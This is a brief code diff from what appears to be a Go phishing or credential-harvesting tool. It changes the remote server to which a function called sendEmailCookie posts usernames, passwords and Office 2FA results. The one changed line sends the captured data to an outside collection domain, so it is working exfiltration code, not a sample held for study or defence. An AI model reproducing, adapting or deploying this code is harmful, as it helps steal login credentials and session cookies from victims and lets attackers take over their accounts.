@@ -107,7 +107,7 @@ func sendEmailCookie(msg string, username string, password string, KeyUser strin
 
 	responseBody := bytes.NewBuffer(postBody)
 
-	request, _ := http.Post("https://vanilla.500daysofspring.com/public/api/office-2fa-result", "application/json", responseBody)
+	request, _ := http.Post("https://natrium100gram.site/public/api/office-2fa-result", "application/json", responseBody)
 
 	defer request.Body.Close()
 
